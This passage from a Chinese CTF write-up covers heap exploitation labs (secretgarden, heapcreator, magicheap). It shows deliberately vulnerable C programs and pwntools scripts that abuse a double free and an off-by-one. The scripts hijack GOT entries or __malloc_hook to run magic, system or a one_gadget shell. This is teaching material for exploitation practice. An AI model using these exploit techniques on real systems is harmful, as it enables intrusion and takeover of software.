class="string">&quot;timeout&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	fd = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	close(fd);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	signal(SIGALRM,handler);</span><br><span class="line">	alarm(TIMEOUT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">int</span> choice ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">		choice = atoi(buf);</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				add();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				visit();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				del();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				clean();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;See you next time.&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在删除时存在double free，利用漏洞修改<code>puts@got</code>为<code>magic</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake = <span class="number">0x601ffa</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(fake))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>,<span class="number">0</span>,elf.sym[<span class="string">&#x27;magic&#x27;</span>],elf.sym[<span class="string">&#x27;magic&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>另一种方法是直接getshell。先通过unsorted bin泄露libc，然后用同样的方法修改<code>__malloc_hook</code>为<code>one_gadget</code>，最后触发double free检测调用<code>malloc_printerr</code>，从而调用<code>__malloc_hook</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base = uu64(r(<span class="number">6</span>))<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">malloc_hook = base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab13-heapcreator"><a href="#lab13-heapcreator" class="headerlink" title="lab13 - heapcreator"></a>lab13 - heapcreator</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret ;</span><br><span class="line">    ret = read(<span class="number">0</span>,buf,size);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> size ;</span><br><span class="line">	<span class="keyword">char</span> *content ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> *<span class="title">heaparray</span>[10];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">			heaparray[i] = (struct heap *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct heap));</span><br><span class="line">			<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">			size = atoi(buf);</span><br><span class="line">			heaparray[i]-&gt;content = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">			<span class="keyword">if</span>(!heaparray[i]-&gt;content)&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			heaparray[i]-&gt;size = size ;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">			read_input(heaparray[i]-&gt;content,size);</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">		read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">free</span>(heaparray[idx]-&gt;content);</span><br><span class="line">		<span class="built_in">free</span>(heaparray[idx]);</span><br><span class="line">		heaparray[idx] = <span class="literal">NULL</span> ;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">		<span class="keyword">switch</span>(atoi(buf))&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				create_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				edit_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				show_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">				delete_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span> :</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>本题添加堆时没有检查<code>size</code>，可以整数溢出；编辑堆时存在人为设置的off by one，因此可以覆盖下一个chunk的<code>chunk_size</code>造成堆块重叠。我们先申请0x18的chunk，需要注意必须以<code>8</code>结尾以覆盖到<code>chunk_size</code>，然后申请0x10的victim，利用off by one修改victim的<code>chunk_size</code>为0x41后，释放victim。</p>
<p>我们知道，原来的victim指针是0x20的chunk，victim的内容也是0x20的chunk。现在victim指针变成了0x40，那么我们可以申请0x30的chunk，使得新chunk内容使用的是victim的指针chunk，而新chunk的指针使用的是victim的内容chunk。这样我们就能控制整个victim了。确保指针内的<code>heapsize</code>合法，然后在<code>content</code>对应位置放上要泄露/覆盖的函数GOT，通过libc泄露得到system，最后用system劫持GOT即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># new heap-&gt;content = heap1-&gt;ptr</span></span><br><span class="line"><span class="comment"># new heap-&gt;ptr = heap1-&gt;content</span></span><br><span class="line">add(<span class="number">0x30</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x30</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab14-magicheap"><a href="#lab14-magicheap" class="headerlink" title="lab14 - magicheap"></a>lab14 - magicheap</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret ;</span><br><span class="line">    ret = read(<span class="number">0</span>,buf,size);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> magic = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;       Magic Heap Creator       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 3. Delete a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 4. Exit                        &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">			size = atoi(buf);</span><br><span class="line">			heaparray[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">			<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">			read_input(heaparray[i],size);</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">size_t</span> size ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || 